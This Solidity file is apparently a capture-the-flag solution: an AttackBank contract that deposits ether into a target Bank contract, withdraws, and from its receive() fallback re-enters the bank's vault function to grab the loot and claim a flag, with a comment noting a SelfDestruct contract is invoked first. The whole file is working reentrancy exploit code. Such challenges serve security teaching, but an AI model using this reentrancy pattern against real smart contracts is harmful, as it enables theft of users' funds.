// SPDX-License-Identifier: MIT

import "./Bank.sol";
pragma solidity 0.7.6;

contract AttackBank {
    Bank public bank;

    constructor(address payable _bank) {
        bank = Bank(_bank);
    }

    function attack() public payable {
        // Need to invoke the SelfDestruct Contract before for it to work.
        bank.depositGold{value: msg.value}();
        bank.withdrawGold(2);
    }

    receive() external payable {
        bank.enterVault("Voler le butin et fuir");
    }

    function flag() external returns (bool) {
        bank.flag();
        return true;
    }
}
